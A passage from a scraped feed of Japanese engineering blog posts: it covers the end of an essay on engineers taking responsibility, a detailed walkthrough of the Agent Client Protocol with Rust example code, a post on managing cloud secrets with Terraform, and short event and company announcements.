って対処する。その積み重ねが信頼となる。皮肉なことに、身銭を切らずに「うまくやった」つもりのエンジニアほど、長期的には信頼を失う。短期的な成功と引き換えに、最も大切な資産を失っているのだ。その仕事、全部やめてみよう――１％の本質をつかむ「シンプルな考え方」作者:小野 和俊ダイヤモンド社Amazon組織における身銭の力少数決原理とは組織の意思決定は多数決で行われると思われがちだが、実際は違う。重要な決定は「少数決原理」に従う。これは、最も失うものが大きい人、つまり最も身銭を切っている人の意見が採用される、という原理だ。例を挙げよう。レストランを選ぶとき、10人中9人が「何でもいい」と言い、1人だけがベジタリアンだったら、ベジタリアン対応のレストランが選ばれる。なぜか？ベジタリアンにとって「肉を食べる」ことのコストは、他の9人が「野菜を食べる」ことのコストより遥かに高いからだ。ソフトウェア開発における少数決原理この原理はソフトウェア開発でも働く。深夜対応を覚悟しているエンジニアが「このシステムは危険だ」と言えば、その声は無視できない。なぜなら、実際に深夜に呼び出されるのは彼だからだ。一方、無責任で言われたことだけやるエンジニアが「大丈夫でしょう」と言っても、その言葉に重みはない。セキュリティインシデントが起きたとき、責任を取ると宣言したエンジニアの「この対策では不十分」という意見は通る。日頃から「僕は関係ない」という態度のエンジニアがいくら正論を述べても、聞き流される。なぜ少数決原理が機能するのか身銭を切る者は、失敗したときのダメージが大きい。だから、彼らの反対意見には切実さがある。「このままでは本当にまずい」という危機感が、組織を動かす。また、身銭を切る者は信頼される。過去に責任を取ってきた実績があるから、その判断は尊重される。「あの人が言うなら」という信頼が、少数意見を多数意見に変える。身銭を切らない者がいくら集まっても、一人の身銭を切る者には勝てない。なぜなら、前者は失敗しても逃げられるが、後者は逃げられないからだ。逃げられない者の必死さが、組織の方向を決める。健全な組織文化への影響少数でも身銭を切るエンジニアがいれば、組織文化は変わり始める。彼らの姿勢は、周囲に伝播する。「あの人がそこまで言うなら、自分も真剣に考えよう」という空気が生まれる。責任を取る姿勢が、チーム全体の当事者意識を高める。逆に、誰も身銭を切らない組織では、意思決定が遅れ、責任の所在が曖昧になり、同じ失敗を繰り返す。最終的には、優秀なエンジニアから去っていく。身銭を切る文化があるかどうかが、組織の命運を分ける。失敗できる組織作者:エイミー C エドモンドソン早川書房Amazonまとめ偉そうなことを書いてきたが、私も完璧ではない。逃げたくなることもある。「これは自分の仕事じゃない」と思うこともある。でも、そんなときこそ思い出す。プロフェッショナルとは何か。小さなことから始めればいい。自分が担当しているサービスの本番データを毎日見る。障害が起きたら、担当外でも飛び込む。「この仕様は良くない」と思ったら、代替案を提示する。そして、その結果に責任を持つ。身銭を切るとは、華々しいことではない。地味で、苦しくて、割に合わないことも多い。でも、振り返ったときに胸を張れる。「あのシステムは、俺が守った」「あの障害は、俺が未然に防いだ」それが、エンジニアとしての誇りだと、私は思う。こういうマインドは先達から学んできたわけですが、書籍で言うと『達人プログラマー』などはとても良い本なのでオススメです。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazonただし、ここで大切な前提を伝えておきたい。人生は仕事だけではない。身銭を切ることと、自己犠牲は違う。エンジニアの努力を正当に評価しない経営者の下で働いているなら、構造的に身銭を切っても報われない環境にいるなら、無理をする必要はない。自分の健康と人生を守ることが最優先だ。もちろん、私の主張には論理的な飛躍もあることは認めざるを得ない。「身銭を切らないから無責任」という単純な因果関係では説明できない複雑さが、現実にはある。権限なき責任を押し付けられる構造、短期的な成果を求める経営圧力——これらを個人の覚悟だけで解決できるわけではない。だからこそ、個人の責任感と組織の構造改革は、車の両輪のように進めていく必要がある。適切な権限と責任のバランス、専門家として意見を言える環境、失敗から学習できる仕組み。これらなしに、個人の覚悟だけに頼るのは持続可能ではない。それでも、まずは身銭の切り方を知らなければ、「ここは踏ん張りどころか、それとも撤退すべきか」という判断すらできない。プロフェッショナルとしての基準を持っていなければ、搾取と成長機会の区別もつかない。だから、あくまでも一人のエンジニアの意見として、この考えを表明した。完璧な答えではないし、すべての状況に当てはまるわけでもない。あなたの環境、あなたの状況に応じて、取捨選択してもらえればと思う。身銭を切ることで得られるのは、単なる技術力ではない。判断力、直感、信頼、そして何より「自分はエンジニアとして真っ当に生きている」という確信だ。強いビジネスパーソンを目指して鬱になった僕の 弱さ考作者:井上 慎平ダイヤモンド社Amazon","isoDate":"2025-09-22T08:53:53.000Z","dateMiliSeconds":1758531233000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"ACPでAgentに行動させる","link":"https://syu-m-5151.hatenablog.com/entry/2025/09/22/094533","contentSnippet":"はじめにこんにちは！今回は、コードエディタや各種開発ツールとAIエージェント間の通信を標準化する Agent Client Protocol (ACP) について、その内部実装と実践的な使用方法を詳しく解説します。github.com最近の界隈では、Model Context Protocol（MCP）が大きな注目を集めていますが、その陰で着実に重要性を増している技術があります。それがACPです。MCPのような華やかさはないものの、実際にエディタプラグインやコーディングエージェントを開発する際には、ACPの理解が不可欠になってきています。なお、ACPを理解する前提としてMCPの基礎知識があると理解が深まります。MCPについては以下の記事で詳しく解説していますので、ぜひ参照してください。syu-m-5151.hatenablog.comまた、みのるんさんから献本いただいたこちらの書籍も、MCPの入門書として非常に参考になりました。実践的な内容が分かりやすくまとめられており、おすすめです。やさしいMCP入門作者:御田稔,大坪悠秀和システムAmazon同名のスライドでも良いのでMCPがわからない人は触れておくと良いと思います。 speakerdeck.comコード開発におけるAI支援ツールが急速に普及する中、実はエディタとAIツールの間には興味深い技術的課題が潜んでいます。それは、エディタごとに個別対応が必要で、使いたいツールの組み合わせが制限されるという問題です。正直なところ、多くの開発者はCopilotやCursorなどの既製品で満足しているでしょうし、この問題を意識することもないかもしれません。しかし、エディタプラグインを自作したい人や独自のAIエージェントを開発したい人、あるいは技術的な仕組みに興味がある人にとって、ACPは実に興味深い技術です。「エディタとAIエージェント間のLSP」として機能するこのプロトコルは、知らなくても困らないけれど、知っていると開発の可能性が大きく広がる、そんな技術と言えるでしょう。本記事では、このややマニアックながらも将来性のあるACPの実装詳細を通じて、プロトコル設計の面白さや、Rustによる非同期通信の実装テクニックなど、技術的に興味深いポイントを深掘りしていきます。ACPとは何か？記事を始める前に、まず ACP (Agent Client Protocol) について簡単に説明しましょう。ACP についてより詳しい情報は、公式GitHubリポジトリ や公式サイトを参照してください。ACPは、Zed Industriesが開発したオープンソースの標準プロトコルで、コードエディタとAIコーディングエージェント間の通信を標準化します。Language Server Protocol（LSP）がプログラミング言語サーバーの統合を革命的に変えたように、ACPは「LSPのAIエージェント版」として、AIツールの統合に同様の変革をもたらすことを目指しています。agentclientprotocol.comACPの仕組みACP は基本的に JSON-RPC 2.0 ベースのプロトコルで、主要な構成要素は以下のとおりです。クライアント（Client）：コードエディタ（Zed、Neovim など）エージェント（Agent）：AIコーディング支援プログラム（Claude Code、Gemini CLI など）セッション（Session）：会話の単位、複数のセッションを並行して管理可能エージェントはエディタのサブプロセスとして実行され、標準入出力（stdin/stdout）を通じて通信を行います。agentclientprotocol.comACPとMCPの関係ACPの技術仕様において重要なのは、Model Context Protocol（MCP）との関係です。MCPは、LLMが外部サービスやローカルリソースにアクセスするためのプロトコルです。ACPは可能な限りMCPの型を再利用し、エディタが既存のMCPサーバー設定を持つ場合、その設定をエージェントに渡すことができます。agentclientprotocol.com{  \\"mcpServers\\": {    \\"filesystem\\": {      \\"command\\": \\"npx\\",      \\"args\\": [\\"-y\\", \\"@modelcontextprotocol/server-filesystem\\"],      \\"env\\": {        \\"ALLOWED_PATHS\\": \\"/path/to/project\\"      }    }  }}JSON-RPC の基本ACP は JSON-RPC 2.0 仕様に基づいており、以下の3種類のメッセージ形式が使われます。agentclientprotocol.comリクエスト：クライアントからエージェントへの要求{  \\"jsonrpc\\": \\"2.0\\",  \\"id\\": 1,  \\"method\\": \\"prompt\\",  \\"params\\": {    \\"sessionId\\": \\"session-123\\",    \\"prompt\\": [{\\"type\\": \\"text\\", \\"text\\": \\"Hello Agent!\\"}]  }}レスポンス：エージェントからクライアントへの応答{  \\"jsonrpc\\": \\"2.0\\",  \\"id\\": 1,  \\"result\\": {    \\"stopReason\\": \\"endTurn\\",    \\"meta\\": null  }}通知：レスポンスを必要としない一方向メッセージ{  \\"jsonrpc\\": \\"2.0\\",  \\"method\\": \\"session/notification\\",  \\"params\\": {    \\"sessionId\\": \\"session-123\\",    \\"update\\": {      \\"type\\": \\"agentMessageChunk\\",      \\"content\\": {\\"type\\": \\"text\\", \\"text\\": \\"Processing...\\"}    }  }}Rustで実装するACPの詳細解説それでは、実際のRustコードを通じてACPの動作原理を深く理解していきましょう。公式リポジトリの実装例（agent.rsとclient.rs）を詳しく解説します。agentclientprotocol.com実装の準備と実行まず、ACPの実装を実際に動かすための手順を確認しましょう：# リポジトリのクローンgit clone https://github.com/zed-industries/agent-client-protocolcd agent-client-protocol/rust# エージェントのビルドRUST_LOG=info cargo build --example agent# クライアントの実行（エージェントを自動起動）cargo run --example client -- ../target/debug/examples/agent# 実行時の対話例> Hello, Agent!| Agent: Client sent: Hello, Agent!> How can you help me with coding?| Agent: Client sent: How can you help me with coding!この実行により、以下の通信フローが発生します。初期化フェーズ: プロトコルバージョンのネゴシエーションセッション確立: 作業ディレクトリとMCPサーバー設定の共有メッセージループ: プロンプトの送信と応答のストリーミンググレースフルシャットダウン: プロセス終了時のリソースクリーンアップエージェント側の実装（agent.rs）基本構造とトレイト実装use std::cell::Cell;use agent_client_protocol::{    self as acp, AuthenticateResponse, Client, ExtNotification,     ExtRequest, ExtResponse, SessionNotification, SetSessionModeResponse,};use tokio::sync::{mpsc, oneshot};struct ExampleAgent {    session_update_tx: mpsc::UnboundedSender<(acp::SessionNotification, oneshot::Sender<()>)>,    next_session_id: Cell<u64>,}構造体の設計思想：session_update_tx：非同期チャネルの送信側で、セッション更新をバックグラウンドタスクに送信next_session_id：Cell<u64>による内部可変性パターンで、&selfの不変参照でも値を更新可能ACPトレイトの実装#[async_trait::async_trait(?Send)]impl acp::Agent for ExampleAgent {    async fn initialize(        &self,        arguments: acp::InitializeRequest,    ) -> Result<acp::InitializeResponse, acp::Error> {        log::info!(\\"Received initialize request {arguments:?}\\");        Ok(acp::InitializeResponse {            protocol_version: acp::V1,            agent_capabilities: acp::AgentCapabilities::default(),            auth_methods: Vec::new(),            meta: None,        })    }重要なポイント：async_trait(?Send)：非Sendなfutureを許可し、LocalSet環境での実行を可能にプロトコルバージョンの明示的な宣言ケイパビリティ交換による機能のネゴシエーションセッション管理async fn new_session(    &self,    arguments: acp::NewSessionRequest,) -> Result<acp::NewSessionResponse, acp::Error> {    log::info!(\\"Received new session request {arguments:?}\\");    let session_id = self.next_session_id.get();    self.next_session_id.set(session_id + 1);    Ok(acp::NewSessionResponse {        session_id: acp::SessionId(session_id.to_string().into()),        modes: None,        meta: None,    })}セッションの概念：各セッションは独立した会話コンテキストMCPサーバー設定の引き継ぎ作業ディレクトリの設定プロンプト処理とストリーミングasync fn prompt(    &self,    arguments: acp::PromptRequest,) -> Result<acp::PromptResponse, acp::Error> {    log::info!(\\"Received prompt request {arguments:?}\\");        for content in [\\"Client sent: \\".into()].into_iter().chain(arguments.prompt) {        let (tx, rx) = oneshot::channel();                // セッション更新の非同期送信        self.session_update_tx            .send((                SessionNotification {                    session_id: arguments.session_id.clone(),                    update: acp::SessionUpdate::AgentMessageChunk { content },                    meta: None,                },                tx,            ))            .map_err(|_| acp::Error::internal_error())?;                // バックプレッシャー制御        rx.await.map_err(|_| acp::Error::internal_error())?;    }        Ok(acp::PromptResponse {        stop_reason: acp::StopReason::EndTurn,        meta: None,    })}ストリーミング設計：チャンク単位でのメッセージ送信oneshot::channel()による同期制御バックプレッシャーによる流量制御メインループとタスク管理メインループは、非同期ランタイムの中核部分であり、実際にエージェントが起動される場所です。#[tokio::main(flavor = \\"current_thread\\")]async fn main() -> anyhow::Result<()> {    env_logger::init();  // RUST_LOG環境変数でログレベルを制御    let outgoing = tokio::io::stdout().compat_write();    let incoming = tokio::io::stdin().compat();    let local_set = tokio::task::LocalSet::new();    local_set        .run_until(async move {            let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel();                        // エージェント接続の確立            let (conn, handle_io) = acp::AgentSideConnection::new(                ExampleAgent::new(tx),                 outgoing,                 incoming,                 |fut| {                    tokio::task::spawn_local(fut);                }            );                        // セッション通知処理タスク            tokio::task::spawn_local(async move {                while let Some((session_notification, tx)) = rx.recv().await {                    let result = conn.session_notification(session_notification).await;                    if let Err(e) = result {                        log::error!(\\"{e}\\");                        break;                    }                    tx.send(()).ok();                }            });                        handle_io.await        })        .await}非同期ランタイムの設計：LocalSet：シングルスレッド実行環境（current_threadフレーバーと連携）spawn_local：非Sendタスクの実行チャネルによるタスク間通信RUST_LOG=info環境変数でログ出力を制御（デバッグ時はRUST_LOG=debug）クライアント側の実装（client.rs）プロセス管理とライフサイクルクライアントは、エージェントをサブプロセスとして起動し管理します。実行時はコマンドライン引数でエージェントのパスを指定します：# 実行例：ビルド済みのエージェントを指定cargo run --example client -- target/debug/examples/agent#[tokio::main(flavor = \\"current_thread\\")]async fn main() -> anyhow::Result<()> {    let command = std::env::args().collect::<Vec<_>>();    let (outgoing, incoming, child) = match command.as_slice() {        [_, program, args @ ..] => {            let mut child = tokio::process::Command::new(program)                .args(args.iter())                .stdin(std::process::Stdio::piped())                .stdout(std::process::Stdio::piped())                .kill_on_drop(true)  // 自動クリーンアップ                .spawn()?;                        (                child.stdin.take().unwrap().compat_write(),                child.stdout.take().unwrap().compat(),                child,            )        }        _ => bail!(\\"Usage: client AGENT_PROGRAM AGENT_ARG...\\"),    };プロセス管理のベストプラクティス：kill_on_drop(true)：親プロセス終了時の自動クリーンアップ（孤児プロセスを防ぐ）ストリーム所有権の明示的な管理（take()メソッド）エラー時のグレースフルシャットダウンエージェントプログラムへの引数の柔軟な受け渡しプロトコル初期化// 接続の確立let (conn, handle_io) = acp::ClientSideConnection::new(    ExampleClient {},     outgoing,     incoming,     |fut| {        tokio::task::spawn_local(fut);    });// バックグラウンドI/O処理tokio::task::spawn_local(handle_io);// 初期化ハンドシェイクconn.initialize(acp::InitializeRequest {    protocol_version: acp::V1,    client_capabilities: acp::ClientCapabilities::default(),    meta: None,}).await?;// セッション作成let response = conn    .new_session(acp::NewSessionRequest {        mcp_servers: Vec::new(),  // MCPサーバー設定        cwd: std::env::current_dir()?,        meta: None,    })    .await?;対話的REPLの実装Rustylineを使用した対話的インターフェースにより、ユーザーはエージェントと直接対話できます：// Rustylineによる対話インターフェースlet mut rl = rustyline::DefaultEditor::new()?;while let Ok(line) = rl.readline(\\"> \\") {    let result = conn        .prompt(acp::PromptRequest {            session_id: response.session_id.clone(),            prompt: vec![line.into()],            meta: None,        })        .await;        if let Err(e) = result {        log::error!(\\"{e}\\");    }}REPLの動作例：> Hello, Agent!| Agent: Client sent: Hello, Agent!> What\'s the weather like?| Agent: Client sent: What\'s the weather like?> exitRustylineの利点：履歴管理（上下矢印キーで過去の入力を参照）カーソル移動とテキスト編集機能Ctrl+C/Ctrl+Dによる適切な終了処理将来的な自動補完機能の追加が可能セッション通知の処理#[async_trait::async_trait(?Send)]impl acp::Client for ExampleClient {    async fn session_notification(        &self,        args: acp::SessionNotification,    ) -> anyhow::Result<(), acp::Error> {        match args.update {            acp::SessionUpdate::AgentMessageChunk { content } => {                let text = match content {                    acp::ContentBlock::Text(text_content) => text_content.text,                    acp::ContentBlock::Image(_) => \\"<image>\\".into(),                    acp::ContentBlock::Audio(_) => \\"<audio>\\".into(),                    acp::ContentBlock::ResourceLink(resource_link) => resource_link.uri,                    acp::ContentBlock::Resource(_) => \\"<resource>\\".into(),                };                println!(\\"| Agent: {text}\\");            }            acp::SessionUpdate::ToolCall(tool_call) => {                println!(\\"| Tool call: {}\\", tool_call.name);            }            acp::SessionUpdate::Plan(plan) => {                println!(\\"| Plan: {}\\", plan.description);            }            _ => {}        }        Ok(())    }エラーハンドリングとプロトコルの堅牢性タイムアウトとリトライの実装use tokio::time::{timeout, Duration};async fn prompt_with_timeout(    conn: &ClientSideConnection,    request: PromptRequest,    timeout_secs: u64,) -> Result<PromptResponse, Error> {    match timeout(        Duration::from_secs(timeout_secs),        conn.prompt(request)    ).await {        Ok(Ok(response)) => Ok(response),        Ok(Err(e)) => {            log::error!(\\"Prompt error: {}\\", e);            Err(e)        }        Err(_) => {            log::error!(\\"Prompt timeout after {} seconds\\", timeout_secs);            Err(Error::request_timeout())        }    }}エクスポネンシャルバックオフasync fn reconnect_with_backoff(    max_retries: u32,) -> Result<Connection, Error> {    let mut delay = Duration::from_secs(1);        for attempt in 1..=max_retries {        match establish_connection().await {            Ok(conn) => {                log::info!(\\"Connected on attempt {}\\", attempt);                return Ok(conn);            }            Err(e) if attempt < max_retries => {                log::warn!(\\"Attempt {} failed: {}\\", attempt, e);                tokio::time::sleep(delay).await;                delay *= 2;  // エクスポネンシャルバックオフ            }            Err(e) => return Err(e),        }    }        Err(Error::max_retries_exceeded())}実践的な統合例Claude Code ACPの設定Claude Code ACP は、AnthropicのClaude AIをACPプロトコル経由で利用可能にする実装です。github.com{  \\"agent_servers\\": {    \\"Claude Code\\": {      \\"command\\": \\"npx\\",      \\"args\\": [\\"@zed-industries/claude-code-acp\\"],      \\"env\\": {        \\"ANTHROPIC_API_KEY\\": \\"your-api-key\\",        \\"ACP_PERMISSION_MODE\\": \\"acceptEdits\\"      }    }  }}Avante.nvimの設定Avante.nvim は、NeovimでACPを利用するための実装です。github.com{  \\"yetone/avante.nvim\\",  event = \\"VeryLazy\\",  build = \\"make\\",  opts = {    provider = \\"claude\\",    mode = \\"agentic\\",    acp_providers = {      [\\"claude-code\\"] = {        command = \\"npx\\",        args = { \\"@zed-industries/claude-code-acp\\" },        env = { ANTHROPIC_API_KEY = os.getenv(\\"ANTHROPIC_API_KEY\\") }      }    }  }}ccswarm での実装筆者が開発している ccswarm プロジェクトでは、当初は独自の仮想ターミナル実装を使用していましたが、ACPの登場を機に、より標準化されたアプローチへの移行を決定しました。github.comセキュリティに関する考慮事項ACPを使用する際には、以下の点に注意が必要です。ACPのセキュリティリスク作っていて思ったのですが、ACPはエージェントにローカル環境への強いアクセス権を付与するので、本質的にセキュリティ上の懸念があります：サードパーティエージェントのリスク: 信頼できない「野良エージェント」をインストールすると、マルウェアや情報漏洩のリスクが高まります権限の過剰付与: エージェントが必要以上の権限を持つと、システムリソースへの不正アクセスの可能性がありますデータ漏洩のリスク: ローカルファイルやクレデンシャルなどの機密情報が、エージェントを通じて外部に漏洩する可能性がありますプロンプトインジェクション攻撃: 悪意あるプロンプトを通じて、エージェントに予期しない操作を実行させるリスクがあります安全なACP利用のための対策信頼できるソースからのみエージェントをインストール: 公式リポジトリや信頼できる開発者からのエージェントのみを使用最小権限の原則を適用: エージェントには必要最小限の権限のみを付与サンドボックス環境での実行: 可能であれば、エージェントを隔離された環境で実行監査ログの有効化: エージェントを通じて実行されたすべてのコマンドや操作を記録機密情報のフィルタリング: APIキーやパスワードなどの機密情報を検出・削除するメカニズムを実装定期的なセキュリティレビュー: エージェントの設定やコードを定期的にレビュー確実なテストの実行: 本番環境に導入する前に、テスト環境で動作を徹底的に検証ACPのメリットと今後の展望開発者にもたらす価値ベンダーロックインからの解放: どのACP対応エディタでも、どのACP対応エージェントでも使用可能開発効率の向上: 統一されたプロトコルにより、新しいAIエージェントの導入が簡単にエコシステムの成長: 標準化により、開発者はそれぞれの得意分野に集中可能実践的な活用シナリオ大規模リファクタリング: プロジェクト全体の構造改善バグ修正フロー: エラー解析から修正まで一貫した支援コードレビュー自動化: セキュリティや品質の包括的チェックプロジェクト横断的な分析: アーキテクチャレベルの改善提案おわりにAgent Client Protocolは、AIコーディング支援ツールの統合における新たな標準として、着実に開発者コミュニティで採用が進んでいます。MCPが大きな話題を集めた一方で、ACPはそこまで注目を浴びていないかもしれません。しかし、エディタ開発者やコーディングエージェントを実装したい開発者にとって、ACPは極めて実用的で学ぶ価値の高い技術です。本記事で詳しく解説したRustの実装例は、ACPの設計思想を理解し、独自のエージェントを開発するための出発点となるでしょう。特に注目すべきは、Rustの所有権システムとACPの非同期通信モデルが見事に調和している点です。LocalSetによる非Sendなfutureの処理、mpscとoneshotチャネルを組み合わせた確実な通信、kill_on_dropによる安全なプロセス管理など、これらの技術的選択は、堅牢で効率的なACP実装の基礎となります。ACPの魅力は、JSON-RPCベースのシンプルなプロトコル設計により、数百行のコードで基本的なエージェントを実装できる敷居の低さにあります。一度ACPに対応すれば、Zed、Neovim、その他のACP対応エディタですぐに利用可能になり、独自のコーディングアシスタントやドメイン特化型エージェントの開発も容易になります。エディタとAIエージェントの統合は今後も加速することが予想され、ACPの知識は長期的な資産となるでしょう。一般的な開発者にとって重要なのは、ACPが派手さはないものの、日々のコーディング作業を着実に改善する実用的な基盤技術であるという点です。MCPのような革新的な印象はないかもしれませんが、LSPがそうであったように、気がつけば開発環境に不可欠な存在となっているでしょう。特に、独自のエディタプラグインやAIコーディングツールを開発したいと考えている方は、ぜひACPの仕様を学び、実装してみることをお勧めします。この標準化されたプロトコルは、あなたのツールを幅広いエコシステムに接続する架け橋となるはずです。参考リソースAgent Client Protocol GitHubリポジトリACP 公式ドキュメントClaude Code ACP実装Avante.nvim プロジェクトModel Context ProtocolJSON-RPC 2.0 仕様zed.dev","isoDate":"2025-09-22T00:45:33.000Z","dateMiliSeconds":1758501933000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"クラウド環境におけるシークレットの扱い","link":"https://blog.masasuzu.net/entry/2025/09/19/203626","contentSnippet":"この内容は、社内のエンジニア勉強会で話した内容です。 speakerdeck.comみなさん。プロダクション環境のシークレット情報をどう扱っていますか?クラウドネイティブなアプリケーション開発において、DBのパスワードや外部APIキーといったシークレットの管理は、セキュリティを確保する上で避けては通れない課題です。この記事では、アプリケーションとインフラそれぞれの視点から、クラウド環境におけるシークレット管理のアンチパターンとベストプラクティスを探っていきます。ここで言うシークレットとはDBのパスワードやAPIキーなどの秘匿すべき情報のことを指します。アプリケーション側の視点まずは、アプリケーションがどのようにシークレットを扱うべきかを見ていきましょう。管理のアンチパターン最初に管理方法のアンチパターンとしては以下のものがありますソースコードに直接記述設定ファイルに平文で記述環境変数に平文で記述(Dockerfileや.envファイルでgit管理するなど)base64エンコードして保存ソースコードに記述すれば、すべての環境で同じ値しか使えず柔軟性がありません。設定ファイルや環境変数に平文で記述し、それをGitで管理してしまうと、何かのミスでリポジトリが流出した際にシークレットも漏れてしまいます。また、隠しているつもりでBase64エンコードするのも同様に危険です。Base64は暗号化ではなく、誰でも簡単に元の文字列に戻せるため、平文で保存しているのと大差ありません。KMSによる暗号化の検討次に考えられるのが、暗号鍵を使った暗号化です。AWSのKMSやGoogle CloudのCloud KMSといった鍵管理サービスを利用する方法が考えられます。フローとしては以下のようになりますでしょうかアプリケーション起動時にKMSのから鍵を取得取得した鍵を利用して暗号化されたシークレットを復号平文のシークレット情報をアプリで利用する一見これで良さそうですが、復号処理をアプリケーションの責務にすると、コードが複雑になるだけでなく、KMSの復号権限をアプリケーション自体に付与する必要があり、管理の懸念点が増えてしまいます。クラウド側のシークレットストアの利用そこで推奨されるのが、クラウドが提供するシークレット管理の仕組みを利用することです。AWSAWS Secrets ManagerAWS Systems Manager Parameter Store(SecureString)Google CloudSecret Managerこれらのサービスは、ECS FargateやCloud Runなどのコンテナ実行環境と統合されています。コンテナの起動時に、これらのストアに保存されたシークレットを、自動的に環境変数やファイルとしてマウントしてくれるのです。これによりアプリケーション側では、シークレットがどこで管理されているかを意識することなく、従来通り環境変数やファイルから値を読み込むだけで済むようになり、責務をシンプルに保つことができます。インフラ側の視点さて、アプリケーションの課題は解決しました。次に、インフラ側で、そのシークレットストアをどう管理するかという課題に移りましょう。取れる手段としては主に以下ものが考えられます。手動でコンソールから設定シークレットの値を平文でIaC管理(tfvarsファイルをgit管理から外す)シークレットの値を暗号化してIaCで管理シークレットストアをIaCで管理、値は手動設定まず手動で管理ですが、これはこれでありだと思ってます。ただし、扱うシークレットの数が増えてきたときに作業が煩雑であったり、手作業がゆえに起こるリソースタグなどの付け間違いなどのミスが発生しうるので、規模が大きくなると現実的ではありません。2つ目ですが、シークレットの値だけあつかるtfvarsファイルをgitignoreしてあげることでレポジトリが漏れてもシークレットの値が漏れないことになります。が、うっかりシークレットの値を人為的なミスでコミットしうるので完全に安全とはいいにくいです。3つ目ですが、これはsops providerを利用するパターンです。これを使うことでKMSキーを利用して暗号/復号がterraformとシームレスに統合できます。一見これで良さそうですが、2点課題があります。KMSリソースを余計に管理なくてはならないStateには平文で保存される前者は必要経費としていいとして、後者は課題となります。Terraformにおいてはstateを見る権限がある人にはシークレットも見れてしまうという懸念があります。シークレットのリソースと値を分離するこの方法の利点は、IaCでシークレット リソースが存在することは管理しつつ、その実際の値はGitの管理下から完全に分離できる点です。初回適用後にコンソールから実際のシークレット値を設定すれば、それ以降 terraform apply を実行しても値がダミー値で上書きされることはありません。これにより、コードレビューなどで誤ってシークレットが漏洩するリスクを原理的に防ぐことができ、非常にバランスの取れた管理方法と言えます。以下サンプルコードです。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}まとめ現時点でのクラウドにおけるシークレット管理のベストプラクティスは、以下のようにまとめることができるでしょう。アプリケーションクラウドのシークレットストア(Secrets Managerなど)と実行環境(ECS, Cloud Runなど)の統合機能を使い、環境変数またはファイルとしてシークレットを読み込む。インフラ(IaC)クラウドのシークレットストアのリソース自体はTerraformで管理する。実際のシークレットの値は ignore_changes を活用して手動で設定し、Gitの管理から分離する。もちろん要件によって取りうる手段は変わるとは思います。他になにか良い方法をご存知でしたら教えて下さい。それでは良いシークレットライフを!関連ページblog.masasuzu.net","isoDate":"2025-09-19T11:36:26.000Z","dateMiliSeconds":1758281786000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-09-19 クラウドにおけるシークレット管理","link":"https://speakerdeck.com/masasuzu/2025-09-19-kuraudoniokerusikuretutoguan-li","contentSnippet":"スリーシェイク社内のエンジニア勉強会で発表した資料\\r\\rクラウドにおいてプロダクション環境でのシークレットの扱い方についてアプリケーションおよびインフラ側でどう管理していくのが望ましいかを詳解","isoDate":"2025-09-19T04:00:00.000Z","dateMiliSeconds":1758254400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2025-08-05 Google Cloud Next Tokyo 2025 Cloud RunとCloud SQLの接続方式と事例","link":"https://speakerdeck.com/masasuzu/2025-08-05-google-cloud-next-tokyo-2025-cloud-runtocloud-sqlnojie-sok-fang-shi-toshi-li","contentSnippet":"","isoDate":"2025-09-17T04:00:00.000Z","dateMiliSeconds":1758081600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"actでGithub ActionsのVibe Codingを加速させる","link":"https://speakerdeck.com/kojake_300/actdegithub-actionsnovibe-codingwojia-su-saseru","contentSnippet":"","isoDate":"2025-09-16T04:00:00.000Z","dateMiliSeconds":1757995200000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Sreakeの英語ブログをはじめました！","link":"https://sreake.com/blog/enabling-en-blog/","contentSnippet":"こんにちは！ Sreake事業部のイリドリシ愛民 (@realaminevg) です。 2020年から継続してきたSreakeブログの運用経験を活かし、今月からSreakeの英語ブログ（Sreake English Bl […]The post Sreakeの英語ブログをはじめました！ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-16T01:00:00.000Z","dateMiliSeconds":1757984400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「Application Development」のスペシャライゼーション認定を取得","link":"https://sreake.com/blog/appdev_specialization/","contentSnippet":"Google Cloud Sell および Service エンゲージメントモデルのプレミアパートナーである株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、Google Cloud Partner Advantage プログラムにおいて、「Application Development - サービス」のスペシャライゼーション認定を取得したことをお知らせします。The post スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「Application Development」のスペシャライゼーション認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-09-12T01:00:00.000Z","dateMiliSeconds":1757638800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Webアプリケーションにオブザーバビリティを実装するRust入門ガイド","link":"https://speakerdeck.com/nwiizo/webapurikesiyonniobuzababiriteiwoshi-zhuang-sururustru-men-gaido","contentSnippet":"2025年9月10日（水）、「Rustの現場に学ぶ〜Webアプリの裏側からOS、人工衛星まで〜」というイベントで登壇させていただきます。\\r\\rhttps://findy.connpass.com/event/359456/\\r\\r他の登壇者の話が聞きたすぎるけど調整能力の圧倒的な不足で登壇したらすぐに帰らなければなりません。\\r\\r今回の発表内容のベースとなったのはこちらのブログです。\\r- 「RustのWebアプリケーションにオブザーバビリティを実装するインフラエンジニアのための入門ガイド」","isoDate":"2025-09-10T04:00:00.000Z","dateMiliSeconds":1757476800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud で目指す クラウド二刀流エンジニア講座 第1回 でパネルディスカッションに出てきました。","link":"https://blog.masasuzu.net/entry/2025/09/10/005523","contentSnippet":"先日、2025年6月4日に開催された 「Google Cloud で目指すクラウド二刀流エンジニア講座」 の第1回にて、「スペシャリストが語る！Google Cloud のメリットを活かすネットワーク、セキュリティのあり方とは？」 と題したパネルディスカッションに登壇いたしました。イベントから少し時間が経ちましたが、当日の内容を振り返り、話したことや、時間の都合上話しきれなかった点などをまとめていきたいと思います。cloudonair.withgoogle.comページとセッションでの資料は以下のとおりです。Session 3 : スペシャリストが語る！Google Cloud 